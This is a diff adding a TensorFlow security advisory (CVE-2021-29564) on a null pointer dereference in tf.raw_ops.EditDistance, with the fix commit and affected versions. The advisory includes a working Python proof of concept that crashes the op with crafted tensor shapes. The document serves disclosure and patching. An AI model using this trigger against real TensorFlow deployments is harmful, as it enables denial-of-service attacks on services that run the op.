@@ -1,0 +1,44 @@
+<h2>TFSA-2021-052: Null pointer dereference in <code>EditDistance</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29564</p>
+<h3>Impact</h3>
+<p>An attacker can trigger a null pointer dereference in the implementation of
+<code>tf.raw_ops.EditDistance</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>hypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)
+hypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)
+hypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)
+truth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)
+truth_values = tf.constant([], shape=[0], dtype=tf.float32)
+truth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)</p>
+<p>tf.raw_ops.EditDistance(
+    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,
+    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,
+    truth_values=truth_values, truth_shape=truth_shape, normalize=True)
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/79865b542f9ffdc9caeb255631f7c56f1d4b6517/tensorflow/core/kernels/edit_distance_op.cc#L103-L159">implementation</a>
+has incomplete validation of the input parameters.</p>
+<p>In the above scenario, an attacker causes an allocation of an empty tensor for
+the output:</p>
+<p><code>cc
+OP_REQUIRES_OK(ctx, ctx-&gt;allocate_output("output", output_shape, &amp;output));
+auto output_t = output-&gt;flat&lt;float&gt;();
+output_t.setZero();</code></p>
+<p>Because <code>output_shape</code> has 0 elements, the result of <code>output-&gt;flat&lt;T&gt;()</code> has an
+empty buffer, so calling <code>setZero</code> would result in a null dereference.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3">f4c364a5d6880557f6f5b6eb5cee2c407f0186b3</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
